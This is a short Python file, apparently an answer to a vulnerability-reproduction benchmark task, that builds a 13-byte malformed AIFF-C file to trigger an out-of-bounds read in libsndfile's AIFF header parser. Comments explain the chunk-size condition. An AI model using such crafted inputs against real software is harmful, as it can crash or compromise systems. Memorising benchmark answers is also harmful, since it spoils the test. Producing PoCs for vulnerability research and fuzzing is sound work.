import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is an out-of-bounds read in libsndfile's aiff_read_header.
        # It occurs when parsing chunks within an AIFF/AIFC file. The loop that reads
        # sub-chunks checks against the top-level FORM chunk's size. If the total size
        # of parsed chunks (C) and the FORM size (S) satisfy 0 < S - C < 8, the code
        # will attempt to read the next 8-byte chunk header, resulting in an
        # out-of-bounds read.
        #
        # This PoC constructs a minimal AIFF-C file to trigger this condition by
        # creating a FORM chunk that contains only the 'AIFC' form type identifier
        # and a single byte of padding.

        # The form type identifier. AIFF files are big-endian.
        form_type = b'AIFC'  # 4 bytes

        # We set the FORM chunk's size to be just large enough to contain
        # the form type and one extra byte.
        # Total size of data within the FORM chunk will be:
        # len(form_type) + 1 (padding byte) = 5.
        form_size = len(form_type) + 1

        # A single padding byte.
        padding = b'\x00'

        # Assemble the final PoC.
        # Structure: 'FORM' <form_size> <form_type> <padding>
        # Total length: 4 ('FORM') + 4 (size) + 4 ('AIFC') + 1 (padding) = 13 bytes.
        #
        # Trace of the vulnerable function:
        # 1. Reads 'FORM' header with size 5.
        # 2. Reads 'AIFC' form type (4 bytes). The internal counter for bytes read is now 4.
        # 3. The chunk-reading loop condition (bytes_read < form_size) becomes (4 < 5), which is true.
        # 4. Inside the loop, it attempts to read an 8-byte chunk header.
        # 5. Only (5 - 4 = 1) byte remains in the FORM chunk's data section.
        # 6. Reading 8 bytes when only 1 is available results in a heap-buffer-overflow.
        
        poc = b'FORM'
        poc += struct.pack('>I', form_size)
        poc += form_type
        poc += padding
        
        return poc
